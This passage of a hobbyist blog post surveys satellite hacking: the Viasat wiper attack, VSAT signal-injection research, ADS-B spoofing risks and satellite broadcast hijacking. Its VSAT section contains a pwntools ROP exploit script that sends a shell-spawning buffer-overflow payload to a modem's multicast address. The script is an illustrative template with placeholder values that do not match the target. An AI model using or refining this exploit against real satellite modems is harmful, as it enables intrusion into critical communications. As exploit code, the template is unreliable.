          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>

You can also find the relevant slides here: ["blackhat: Glitched On Earth by Lennert Wouters"](https://i.blackhat.com/USA-22/Wednesday/US-22-Wouters-Glitched-On-Earth.pdf)


## SPACE WARS & The Viasat Attack (2022)


<center>

![](SAT/star_wars.gif)

</center>


Now, the [Viasat attack](https://en.wikipedia.org/wiki/Viasat_hack) is probably one of the most documented events when It comes to cyberattacks aimed at satellites.

To summarize it:
>The Viasat hack was a cyberattack against the satellite internet system of American communications company Viasat which affected their KA-SAT network.


Now I'm not pointing fingers who did it... But the NSA claims It was Russia, so... 




...

Yeah It was Russia... In fact the attack happened on the day of Russia's invasion of Ukraine..
So most likely It was a planned attack that was only executed either because a convenient opening was found or an order was given...



Whichever It is, the fact is that this is probably the most sophisticated and most coordinated attack on satellite systems that has been studied and analysed publicly. 



But if you want a deeper analysis on the whole Russia-Ukraine cyberwar please check out [Hacking the Cosmos: Cyber operations against the space sector: A case study from the war in Ukraine](https://www.research-collection.ethz.ch/bitstream/handle/20.500.11850/697348/cyber-reports-2024-10-hacking-the-cosmos.pdf) by [Clémence Poirier](#Clemence-Poirier) where she dives into the different attacks that happened, relevant threat actors, their behaviors and what It means as a whole to the european space sector and critical infrastructure in general.

<div style="margin-top:-52%;scale:0.8;padding-left:50%;z-index:-1;position: relative;"> 

![](SAT/howling_dawn.png)

</div>

---


However, we're interested in the technical aspect of the attack and not the geo-political aspect of it... 



which can be explained in this sentence:
>A VPN installation, in a Turin management center, which provided network access to administrators and operators was targeted and the hackers gained access to management servers that gave them access to information about company’s modems. After a few hours, the hackers gained access to another server that delivered software updates to the modems which allowed them to deliver the wiper malware AcidRain.

So basically a [wiper](https://en.wikipedia.org/wiki/Wiper_(malware)) attack that happened like this:

![](SAT/wiper.jpg)

and results?

>Thousands of Viasat modems went offline. The attack caused the malfunction in the remote control of 5,800 Enercon wind turbines in Germany and disruptions to thousands of organizations across Europe...

Multiple government agencies got involved all of which were contacting Viasat to no avail...

You also need to understand that the affected routers were permanently damaged... meaning there was no update and literally nothing Viasat can do to repair the damages other than replacing the routers themselves...

And so, the Viasat incident response team was made on the fly and they tried to dynamically adapt to the different attacks that were happening and thoroughly analysing the wiper attack.

(Note: there were also other attacks like a [DHCP relay attack](https://ktflash.gitbooks.io/ceh_v9/content/73_dhcp_attacks.html) which was mentioned around 35 minutes into the video)


<!-- info about the specific steps they took to troubleshoot, defend, and harden their system -->
<iframe width="960" height="415" src="https://www.youtube.com/embed/qI_ICtX3Gm8?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/qI_ICtX3Gm8?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/qI_ICtX3Gm8/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>

If you want to learn more about what Viasat learned from this attack, the investigation and digital forensics done by the NSA and the  logistical and criminal side of things, you can watch this talk:

<iframe width="960" height="415" src="https://www.youtube.com/embed/RdjthhBylMk?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/RdjthhBylMk?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/RdjthhBylMk/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>


## VSAT HACKING - One Man Army

<center>

![](SAT/dead_space.gif)
(Footage Taken From Dead Space)

</center>

Can a singular malicious bad actor hack [VSAT (Very-small-aperture terminal)](https://en.wikipedia.org/wiki/Very-small-aperture_terminal) modems on his own?
Can a hacker with 2000$ worth of equipment and advanced knowledge in this field cause chaos and disruption?

The answer is an astonishing YES!!!

You can hack VSAT modems SOLO!

Without access to any ground station or any specialized equipment...

I don't know how this went under the radar, but there is this paper that showcases how you can wirelessly attack VSAT satellite routers (modems)...

And yes, WIRELESSLY! As in someone aiming a random dish at your satellite router and Voila! You're hacked...
And "hacked" here ranges from:

- resetting the modem
- updating the modem and uploading a malicious firmware
- Obtaining a remote admin shell!!! YES! [Over-the-air](https://en.wikipedia.org/wiki/Over-the-air_update) based [RCE](https://en.wikipedia.org/wiki/Arbitrary_code_execution)!


The first mention of this attack is availabe at [Wireless Signal Injection Attacks on VSAT Satellite Modems @USENIX](https://www.usenix.org/conference/usenixsecurity24/presentation/bisping) where It was researched and published by [Robin Bisping](#Robin-Bisping), [Johannes Willbold](#Johannes-Willbold), [Martin Strohmeier](#Martin-Strohmeier) and [Vincent Lenders](#Vincent-Lenders).

You can read the [Wireless Signal Injection Attacks on VSAT Satellite Modems Paper here](https://www.usenix.org/system/files/usenixsecurity24-bisping.pdf)

Which is provided alongside a video explaining it (although I advice watching the DEF CON presentation mentioned later instead): 


<iframe width="960" height="415" src="https://www.youtube.com/embed/Fv1fz_ewV6s?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/Fv1fz_ewV6s?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/Fv1fz_ewV6s/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>


<div style=" font-size:20px">

BREAKING THE BEAM
</div>


The attack was also presented at DEF CON by the mentioned authors titled `"Breaking the Beam: Exploiting VSAT Satellite Modems from the Earth's Surface"` and thankfully they've shared all the relevant [slides](https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Vincent%20Lenders%20Johannes%20Willbold%20Robin%20Bisping%20-%20Breaking%20the%20Beam%20-%20Exploiting%20VSAT%20Satellite%20Modems%20from%20the%20Earths%20Surface.pdf).


They go even more in depth in their presentation at DEF CON:

<iframe width="960" height="415" src="https://www.youtube.com/embed/-pxmly8xeas?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/-pxmly8xeas?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/-pxmly8xeas/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>

And honestly this defcon presentation uncovers a lot of the things they didn't cover in that paper.
Note: [relevant info about the DEF CON presentation can be found here: defcon_32_speakers#54510](https://defcon.org/html/defcon-32/dc-32-speakers.html#54510)

Now, as to my knowledge, there's no public CVE for this hack but the authors have already contacted the security team of the providers so hopefully they've already fixed this issue...

<div style="float: right;width:40%;position: relative;">

![](SAT/miku.gif)
<center>

[MIKU MIKU BEAM!!!!!💫💫💫](https://www.youtube.com/watch?v=7XjvO-42fBE)

</center>

</div>

The attack targets [Newtec MDM2200 Satellite Modems](http://www.satcomsource.com/Newtec-MDM2200-Sat3Play-Modem.pdf) which have already reached their EOL (end-of-life) where you'd usually be prompted with `This product has reached end of life and has been replaced by the MDM2210 series` but you'd still find it being used today.

And honestly the main part that caught my attention here was the [RCE](https://en.wikipedia.org/wiki/Arbitrary_code_execution) so I'm going to dig deeper on how It's implemented:

First, great conditions were met (from an attacker's perspective):

- The router uses an <b>`outdated Operating System`</b>,
to be precise It's [linux version (2.6.35) (Linux_2_6_35)](https://kernelnewbies.org/Linux_2_6_35) which
was released on the <b>1st of August, 2010</b>.
Yes, 2010! For reference,
that's roughly when most people [used windows XP](https://www.w3schools.com/browsers/browsers_os.asp#:~:text=7.2-,August,-22.3)
and everyone was listening to [Hatsune Miku](https://en.wikipedia.org/wiki/Hatsune_Miku)'s
[baka baka baka (Triple Baka)!!!](https://www.youtube.com/watch?v=duPJqfKiA78)

- No [ASLR (Address space layout randomization)](https://en.wikipedia.org/wiki/Address_space_layout_randomization)

- No [Stack Canaries](https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries)

- A [Buffer Overflow (BOF)](https://en.wikipedia.org/wiki/Buffer_overflow) vulnerability exists within the code
and thanfully we can have an idea of how that looks like in
<b>`sw_download`</b> (binary included in the modem that handles updates):

```c
int parse_INFO(char* buf, size_t buf_len){
    char vuln[80];
    // ...
    ret = sscanf(buf + offset + 3,"%s", vuln); // <---- VULNERABILITY IS HERE
    ret = strcmp(vuln, "octet"); 

    if (ret==0){
        // PARSE SUCCESS
    }
    // ..
    return 0;
}
```

(Explanation: sscanf() here has no upper limit to the bytes It reads from "buf" which means we can supply it with the 80 needed for "vuln" and start overwriting values, variables and registers that come after it...)

It also listens to a multicast range (from the slides the application is listening to 239.1.0.1)

So in conclusion, It can be easily hacked, or rather, [pwn](https://en.wikipedia.org/wiki/Leet#Owned_and_pwned)'ed with only a few scripts or by using [pwntools](https://docs.pwntools.com/en/stable/) and the exploit itself (the [ROP chain](https://en.wikipedia.org/wiki/Return-oriented_programming)) can be more or less like this:
```py
from pwn import *

# Target details (multicast IP and port)
MCAST_GRP = '239.1.0.1'  # Multicast IP address
MCAST_PORT = 1337         # Replace with actual port

# Set up the binary (the path to the vulnerable binary)
binary = './vulnerable'   # Path to binary
elf = ELF(binary)

# Set up libc (if using local testing, replace with remote libc if needed)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")  # Replace with actual libc path

# Get system() and /bin/sh addresses (hardcoded, since no ASLR or PIE)
system_addr = libc.symbols['system']  # Address of system() function
bin_sh = next(libc.search(b'/bin/sh'))  # Address of "/bin/sh"

# Find the ROP gadget for "pop rdi; ret" (this will pop the argument into rdi for system())
rop = ROP(elf)

# Find the "pop rdi; ret" gadget
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret']).address

# Payload setup
offset = 80  # The offset for the buffer overflow (adjust accordingly)

# Construct the ROP chain:
payload = flat(
    b"A" * offset,           # Overflow the buffer with 'A's
    p64(pop_rdi_ret),        # Pop the argument ("/bin/sh") into rdi
    p64(bin_sh),             # Argument for system() -> "/bin/sh"
    p64(system_addr)         # Call system() with "/bin/sh"
)

# Create the UDP socket for multicast
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)

# Set socket options for multicast (TTL, reuse address)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)

# Send the payload to the multicast address and port
sock.sendto(payload, (MCAST_GRP, MCAST_PORT))

# Close the socket
sock.close()

# Print a success message
log.success(f"Payload sent to multicast address {MCAST_GRP}:{MCAST_PORT}")
```
And this would allow for the injection of our custom script (in our case here system("/bin/sh")).

Now simply sit down, aim your antenna and have a nc listener on the side, and that's it...

The only change we might apply here is the way our terminal communicates with that of the modem; but seeing how It uses [TCP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol)(&[UDP](https://en.wikipedia.org/wiki/User_Datagram_Protocol))/[IP](https://en.wikipedia.org/wiki/Internet_Protocol) for Its Transport and Network layer on top of [DVB-S2](https://en.wikipedia.org/wiki/DVB-S2), there's really not much difference from your usual network communication...






# Other fun stuff!!!
<center>

![](SAT/gits.gif)

<div style="font-family: Arial, sans-serif; font-size: 20px;">
Some of the stuff I'm gonna mention here lays on grey grounds, so...<br>
𝐃𝐎 𝐍𝐎𝐓 𝐑𝐄𝐏𝐋𝐈𝐂𝐀𝐓𝐄 𝐓𝐇𝐄𝐌<br>
Or at least if you do, I'm in no way shape or form associated with what you do &lt;3
<br>
</div>

</center>

## Creative ways to get arrested, ADS-B/C & SDR (Software Defined Radio)

If you're interested in learning more about software defined radio
do yourself a favor and watch this presentation by [Gerard de Jong](https://x.com/gddejong):

<iframe width="960" height="415" src="https://www.youtube.com/embed/gMwciWchH3Q?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/gMwciWchH3Q?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/gMwciWchH3Q/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>

Here we're more interested in the [ADS-B](https://en.wikipedia.org/wiki/Automatic_Dependent_Surveillance%E2%80%93Broadcast) part mentioned around (28:28)

And my main point with this part here is that
systems used for mission-critical automatic and human decisions, and have direct impact on the overall air-traffic safety suffer from: 
- lack of entity authentication to protect against message
injection from unauthorized entities.
- lack of message signatures or authentication codes to
protect against tampering of messages or impersonating
aircrafts.
- lack of message encryption to protect against eavesdropping.
- lack of challenge-response mechanisms to protect
against replay attacks.
- lack of ephemeral identifiers to protect against privacy
tracking attacks.


In fact, most of this is unfiltered and accessible to everyone...
Meaning any enthusiast, researcher and journalist can easily track his flight (or any flight for that matter) at [globe.adsbexchange.com/](https://globe.adsbexchange.com/)

![](SAT/airplanes.png)


Just imagine someone creating artificial "ghost" planes and all of them are calling a 7700 emergency...

In fact, by using a Raspberry Pi you can pretty much spoof on all ADS-B traffic, [Angelina Tusboi](#Angelina-Tsuboi-Presentations-Courses-and-QnA’s) goes in depth into this in this DEF CON presentation:

<iframe width="960" height="415" src="https://www.youtube.com/embed/KytDyg5s-E8?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/KytDyg5s-E8?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/KytDyg5s-E8/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>

And you can check this [paper: Ghost in the Air(Traffic): On insecurity of ADS-B protocol and practical attacks on ADS-B devices](https://media.blackhat.com/bh-us-12/Briefings/Costin/BH_US_12_Costin_Ghosts_In_Air_WP.pdf) that goes more in depth into ADS-B and how it can be exploited.
(It also references my favorite movie & show Ghost In The Shell <3)



You can check references for more papers/research on SDR and ADS-B security by the way...
<!-- TODO: add ref -->
Note: There's also "ADS-C" that has been on the rise lately and there is a great presentation about it by [Martin Strohmeier](#Martin-Strohmeier)

<iframe width="960" height="415" src="https://www.youtube.com/embed/vJWzTt2ANAQ?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/vJWzTt2ANAQ?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/vJWzTt2ANAQ/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>



## Free Internet / Phone calls:

If you wish to go back in time and experience high latency internet connections that you're pirating from a foreign satellite, then I suggest you watch [Peter Fairlie](https://www.youtube.com/@peterfairlie2296)'s video about it:

<iframe width="960" height="415" src="https://www.youtube.com/embed/54DGCDpYvGA?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/54DGCDpYvGA?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/54DGCDpYvGA/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>



## Hacking dead satellites & jamming broadcast signals


Just thought I'd leave this part here to say that other types of satellite hacking exists...
mainly hacking in the sense of managing broadcast signals or interfering with dead satellites...

This video presentation (from DEF CON 30) showcases how a hacking group called [shadytel](https://x.com/shadytel) was able to legally stream from a satellite in geostationary orbit (just before reaching its EOL back in 2020):
<iframe width="960" height="415" src="https://www.youtube.com/embed/wQubk70g2wI?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/wQubk70g2wI?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/wQubk70g2wI/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>

Here, [Karl Koscher (aka. supersat)](#Karl-Koscher) goes in depth into how he and his team hacked the [AnikF1R](https://en.wikipedia.org/wiki/Anik_(satellite)#Anik_F1_and_F1R) satellite and streamed footage from space.

Note: The whole presentation can be pretty much summarized in this quote taken from a [VICE article](https://www.vice.com/en/article/hackers-took-over-a-commercial-satellite-to-broadcast-hacker-movies/) about this hack:

>“Satellites basically just reflect whatever signal is sent up to them. There’s no authentication or anything,” he said. “If you’re loud enough, and if there’s another user on that transponder, you have to shout louder than them. But if there’s no one there, [the satellite] will just repeat it.”



And at this point I went down a rabbit hole of broadcast hacking and different events where someone or some group took over access of some satellite or broadcast network like the terrestrial relay attacks that happened back in the 1980s, the most infamous being [Captain Midnight broadcast signal intrusion](https://en.wikipedia.org/wiki/Captain_Midnight_broadcast_signal_intrusion) or the [Max Headroom signal hijacking](https://en.wikipedia.org/wiki/Max_Headroom_signal_hijacking)..

And if you wish to learn more about space jamming and satellite signal hijacking you can watch [James Pavur](#James-Pavur)'s presentation on it from DEF CON:

<center style="margin-top:-28%;max-width:40%;padding-left:55%;z-index:-1;position: relative;">

![](SAT/max_headroom.gif)

</center>

<iframe width="960" height="415" src="https://www.youtube.com/embed/Ouyln7CeWJU?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/Ouyln7CeWJU?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/Ouyln7CeWJU/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>


(And this blog is getting a bit too long hence I decided to just get it over with so I can publish it already...)

## Hacking & Resurrecting Zombie Satellites

<center>

![](SAT/death_stranding.gif)
(Footage taken from [Death Stranding](https://en.wikipedia.org/wiki/Death_Stranding))

</center>

This part is an homage to the recovery of [BEESAT-1 (Berlin Experimental and Educational Satellite 1)](https://en.wikipedia.org/wiki/BeeSat-1):

What happens when a satellite is no longer needed?

One of two things rly:

1. It gravitates back to earth, suffers from [orbital decay](https://en.wikipedia.org/wiki/Orbital_decay) and [burns to ashes in its atmosphere](https://en.wikipedia.org/wiki/Atmospheric_entry).. 

2. It somehow keeps orbiting earth indefinitely and finds that sweet spot where It can just keep rotating forever and becomes what's called [space debris](https://en.wikipedia.org/wiki/Space_debris)...
And we can't even communicate with it because nearly all 6 people who really knew how the satellite worked have probably retired and are either living by cabin in the woods or raising animals in a barn/smallfarm...
Here, It's called a [zombie satellite](https://en.wikipedia.org/wiki/Zombie_satellite).


And honestly there is no general rule as to how you'd communicate with these satellites since each one is different, but there was a case where a hacker by the pseudonym [@pistonminer](https://x.com/pistonminer) was able to bring back a satellite from the dead and fix the telemetry.

The talk was presented at [CCC (Chaos Communication Congress)](https://en.wikipedia.org/wiki/Chaos_Communication_Congress) and you can find the [briefing](https://events.ccc.de/congress/2024/hub/en/event/hacking-yourself-a-satellite-recovering-beesat-1/) and other interesting talks online.



<iframe width="960" height="415" src="https://www.youtube.com/embed/KdTcd94pVlY?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/KdTcd94pVlY?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/KdTcd94pVlY/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>

(mirror can be found [@media.ccc.de](https://media.ccc.de/v/38c3-hacking-yourself-a-satellite-recovering-beesat-1) and [the deutsche version of this talk is available on YT](https://www.youtube.com/watch?v=Kus3mQ8PQTc&list=PL_IxoDz1Nq2YICxl-KtTHOjEwxIOIsPrs&index=214&ab_channel=media.ccc.de))

I won't really go into the technical part of this whole talk because to me
It's less hacking and more "How to deal with [technical debt](https://en.wikipedia.org/wiki/Technical_debt) in space"...
I mean, herrgott nochmal, `the camera wasn't even tested until It was launched into space!!`

Anyways, the whole talk is more or less great if not for the constant tingling sound of the jingling collar...
And I appluad the persistence to be able to reverse and analyse archaic software.







# Learn by hacking satellites yourself:<br>Simulation, Digital Twins & HACK-A-SAT!

## HACK-A-SAT


I wanted to leave this part specifically for [Hack-A-SAT](https://hackasat.com/) as they are extremely underrated and udnerappreciated...

Seriously, their CTFs are some of the best content you can experience, from creative challenges to full on VR experience that barely more than a few hundred people got to experience...


![](SAT/has3.png)


I mean last year, [Hack-A-Sat 4](https://hackasat.com/hackasat4/) made history as the world's first CTF competition IN SPACE!!

And teams had control of different ground stations from the south pole where they'd compete over pwn'ing the space satellite!

and you can find a lot of cool content on their [github (deptofdefense/hack-a-sat-library)](https://github.com/deptofdefense/hack-a-sat-library)

<div style="margin-top:-10%;max-width:40%;padding-left:55%;z-index:-1;position: relative;"> 
<!-- padding-bottom:20%; -->

![](SAT/hack-a-sat.png)

</div>


## Open Source Software & Hardware for satellites

If you want to replicate a satellite and try to find various security vulnerabilities, you can try using [UPSat](https://en.wikipedia.org/wiki/UPSat) as a frame of reference and maybe try and go from there... 

It's was the first satellite launched into orbit made entirely of open-source software and open-source hardware

Although I didn't dig deeper into it here since It's kind of outdated in today's standards and unless you can fund launching your satellite into orbit, It's basically either just a virtual satellite or just another rasberry Pi...


[Gitlab link for the UPSat open source software+hardware](https://gitlab.com/librespacefoundation/upsat)

And you can check the authors' video about it, they even dig deeper into the various challenges that come with:

<iframe width="960" height="415" src="https://www.youtube.com/embed/WQW4x_8rRY4?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/WQW4x_8rRY4?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/WQW4x_8rRY4/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>


There's also the [Open Source Satellite programme](https://www.opensourcesatellite.org/) and they offer a free and open source version of their OBC (On Board Computer) just a year after the launch of the OSSat: [Github Link for the OSSAT OBC](https://github.com/Open-Source-Satellite/OSSAT_OBC_Dev_Board)




Various relevant links:

[How “Digital Twins” Could Help Us Predict the Future | Karen Willcox | TED](https://www.youtube.com/watch?v=r2_VWdjxchY)
[DEF CON 30 - Hunting for Spacecraft Zero Days using Digital Twins](https://www.youtube.com/watch?v=t_efCpd2PbM)
[ DEF CON 29 Aerospace Village - Hack A Sat 2 - The Good, the Bad and the Cyber Secure ](https://www.youtube.com/watch?v=G3YA5Sa5Wbs)

<!-- CUBE SAT -->

<!-- HACK A SAT -->
# Resources & References:
<br>

## Section 0: (Influence & People)

I'm a firm believer that documenting the facts and knowledge should be associated with those who allowed us to get there... especially in cyber.

It is people, human beings, who are behind these black mirrors.


And this work could not have been done without standing on the shoulders of these giants!


I should also preface that the order has no indication of technical expertise or overall contribution and is solely based on personal preferance!!!


These people inspired me the most:

<div style="margin-top:-32%;max-width:40%;padding-left:55%;z-index:-1;position: relative;"> 
<!-- padding-bottom:20%; -->

![](SAT/the_eye.png)

</div>

### Andrzej Olchawa:

X:  [@0x4ndy](https://x.com/0x4ndy)
Site: [https://andy.codes/](https://andy.codes/)

Seriously, this guy's work opened my eyes to satellites-hacking and deserves the utmost respect o7!
He also has research on other hardware related stuff like HID attacks [(this one being my favorite)](https://andy.codes/blog/security_articles/2024-11-27-the-ultimate-handheld-hacking-device.html) and whatnot, so *PLEASE CHECK HIM OUT!*

[How to crash a Spacecraft – DoS through Vulnerability in NASA CryptoLib v1.3.0](https://visionspace.com/crashing-cryptolib/)

[*DEF CON 32* - Ground Control to Major Threat Hacking the Space Link Extension Protocol](https://www.youtube.com/watch?v=QvywfDmdasc)

[Ground Control To Major Threat: Hacking The Space Link Extension Protocol - Andrzej Olchawa *BSIDES*](https://www.youtube.com/watch?v=CJncXmQ5RYw)

other stuff I seen/used/liked by him:
[HID attack with Nethunter](https://andy.codes/blog/security_articles/2024-11-08-quack-quack-hid-attacks-with-nethunter.html)


### Lennert Wouters
If you're doing research on satellite security recently, chances are you're gonna stumble upon this guy at least a few times:
[@LennertWo](https://x.com/lennertwo)

He's a great Researcher who's very famous for his SpaceX Starlink's hack and presentation at DEF CON 30:
[*DEF CON 30* - Lennert Wouters - A Black-Box Security Evaluation of SpaceX Starlink User Terminal](https://www.youtube.com/watch?v=myKs04lfuy8)

which also has other variations where he also goes in depth:
[Glitched on Earth by Humans: A Black-Box Security Evaluation of the SpaceX Starlink User Terminal (*Black Hat*)](https://www.youtube.com/watch?v=NXqLMmGwJm0)




### François Quiquet (Blogs & Articles)

You can find various blogs and articles covering space related cybersecurity

["Space and Satellites Security Conferences at DEF CON 32 (and a little bit Aviation Security)" collection](https://www.spacesecurity.info/en/space-and-satellites-security-conference-at-def-con-32-and-a-little-bit-aviation-security/)

["An analysis of the Viasat cyber attack with the MITRE ATT&CK® framework"](https://www.spacesecurity.info/en/an-analysis-of-the-viasat-cyber-attack-with-the-mitre-attck-framework/)
and the updated blog on dec 2023:
[Viasat Attack: A Space Cyber Attack Post Mortem Investigation](https://www.spacesecurity.info/en/space-cyber-attack-post-mortem-a-viasat-attack-investigation/)



[and the subsequent blog that led me down the rabbit hole that lead me to learning about Angelina Tsuboi](https://www.spacesecurity.info/en/my-work-about-the-viasat-attack-analysis-featured-in-the-angelina-tsubois-course-on-satellite-cybersecurity-foundations-hosted-on-udemy/)

Oh and by the way, he does also have a few French blogs here and there if you're into that (some of which are about nature and adventure ˚˖𓍢ִ໋🍃˚.⛰️⋆☁️)

### Angelina Tsuboi (Presentations, Courses and QnA's):

website: [https://www.angelinatsuboi.net/](https://www.angelinatsuboi.net/)
github: [ANG13T](https://github.com/ANG13T)
[@AngelinaTsuboi](https://x.com/AngelinaTsuboi)

